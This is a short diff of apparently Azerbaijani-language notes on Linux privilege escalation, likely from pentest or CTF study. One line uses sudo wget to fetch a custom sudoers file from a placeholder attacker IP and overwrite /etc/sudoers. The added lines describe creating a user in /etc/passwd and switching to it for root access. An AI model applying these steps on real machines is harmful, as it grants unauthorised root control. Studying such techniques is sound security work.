@@ -23,13 +23,8 @@ sudo /usr/bin/wget <ATTACKER_IP>:8000/<CUSTOM_SUDOERS_FILE> -O /etc/sudoers
 beləliklə user sudoers faylındadadır və parolsuz roota keçə bilərik 
 
 3 cü yol
-özümüz bir 
-
-
-
-
-
-
+özümüz bir user yaradırıq bu user i /etc/passwd ya əlavə edirik 
+sonra su user 
 
 
 
